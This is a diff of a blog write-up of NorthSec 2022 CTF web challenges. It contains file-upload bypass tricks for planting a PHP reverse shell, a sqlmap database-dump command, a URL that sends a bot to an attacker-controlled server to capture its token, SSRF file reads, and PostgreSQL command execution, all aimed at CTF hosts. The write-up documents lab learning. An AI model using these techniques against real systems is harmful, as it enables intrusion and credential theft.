@@ -94,11 +94,11 @@ So here the challenges are to evade validation and upload a php file with remote
 
 So for the first challenge I renamed my file to reverse.jpg.php. The file will be interpreted as PHP and my code could be executed. The validation probably only check if the allowed extension was in the filename.
 
-For the second challenge I needed to modify the Content-Type header for image/jpeg with the [following value](https://en.wikipedia.org/wiki/List_of_file_signatures):
+For the second challenge I needed to modify the Content-Type header for image/jpeg with the following value:
 
 ![Content-Type header](/will-hack-for-coffee/assets/images/nsec2022/content-type.png)
 
-For the third challenge I submitted the same file and it warn me that the signature didn't match a JPEG file. So I used the website hexed.it and modified the signature. 
+For the third challenge I submitted the same file and it warn me that the signature didn't match a JPEG file. So I used the website hexed.it and modified the [signature](https://en.wikipedia.org/wiki/List_of_file_signatures). 
 
 ![Hexed.it](/will-hack-for-coffee/assets/images/nsec2022/hexed.png)
 
@@ -108,7 +108,7 @@ For the fourth upload challenge I renamed the file to rev.png.php3 a less used b
 
 ## SQL 101 and 102
 
-A nice tip that I learned from Burp is that you can submit a single quote (') to a form to test for SQL injection. If there is an error there a strong possibility that it's vulnerable to SQL injection. I didn't bother for this as I already knew there was a SQL injection. Last year I suggested to a teammate that he could have used [SQLmap to solve that challenge](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellQueryLanguage/) but I didn't took the time to try it myself. From what I understand it's a blind SQL injection so I tried a couple of command but here the one that worked for me:
+A nice tip that I learned from Burp is that you can submit a single quote (') to a form to test for SQL injection. If there is an error there a strong possibility that it's vulnerable to SQL injection. I didn't bother for this as I already knew there was a SQL injection. Last year I suggested to a teammate that he could have used [SQLmap to solve that challenge](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellQueryLanguage/#flag-1) but I didn't took the time to try it myself. From what I understand it's a blind SQL injection so I tried a couple of command but here the one that worked for me:
 ````
 └─$ sqlmap -u http://chal4.hackademy.ctf --data "password=admin&username=admin" -p "password,username" --method POST --current-db --dump --technique=BEUSTQ
         ___
@@ -194,10 +194,10 @@ Navigating the first link and looking at Burp I saw that there was a redirect co
 
 ![JWT redirect](/will-hack-for-coffee/assets/images/nsec2022/jwt-redirect.png)
 
-You can use [jwt.io](jwt.io) to checkout what's inside the token and confirm it's a JWT but everytime I see the string "eyJ" I suspect a JWT.
+You can use [jwt.io](jwt.io) to check what's inside a token and confirm it's a JWT. The next link on the website allows you to provide an URL and the "Grand master pentester" will visit it. Our team owned a small server on the nsec network so I redirected him there:
 
-I found this challenge interesting, it was the first time I saw simple redirection used to steal credentials. Next link allows you to provide an URL and the "Grand master pentester" will visit it. Our team own a small server on the nsec network so I redirected him there:
 http://chal5.hackademy.ctf/?sub_url=http://shell.ctf
+
 Looking at our server log:
 ````
 ...
@@ -274,7 +274,7 @@ I then used that base64 string in the s parameter and got the flag.
 
 ## (Server Side Request) Forgery 101, 102 and 103
 
-This website allows you to send some commands like ping and such. But you can also use a less well-known protocol called file and obtain file located on the server and it will not be interpretated. I'm not familiar with PHP file structure but apparently, it's a well known file:
+This website allows you to send some commands like ping and such. But you can also use a less well-known protocol called file and obtain file located on the server and it will not be interpretated. Let's take a look at the config file of the API:
 
 ![Server Side Request Forgery 101](/will-hack-for-coffee/assets/images/nsec2022/ssrf101.png)
 
@@ -343,7 +343,7 @@ Then I used that parameter to get the flag:
 user=postgres&password=Let%26me%3Din&query=SELECT * from flag.flag_25bb3839f80731bb
 ````
 
-The last flag was simply /flag.txt last year so I lucked out getting it. This year it was fixed so I had to use remote command injection (reverse shell would have been even [better](https://erichogue.ca/2022/05/NorthSec/HackademyForgery#forgery-103---obtain-hrce-hackademy-recognized-certified-expert)!). It's well [explained](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) here and it work well even if the syntax is kinda weird (make sure to disable this on your production server!):
+In last year CTF, the flag was in a flag.txt located at the root folder so I lucked out getting it. This year this was fixed so I had to use remote command injection (reverse shell would have been even [better](https://erichogue.ca/2022/05/NorthSec/HackademyForgery#forgery-103---obtain-hrce-hackademy-recognized-certified-expert)!). It's well [explained](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) here and it work well even if the syntax is kinda weird (maybe disable this on your production server?):
 
 ![Postgresql remote command execution](/will-hack-for-coffee/assets/images/nsec2022/postgresql-rce.png)
 
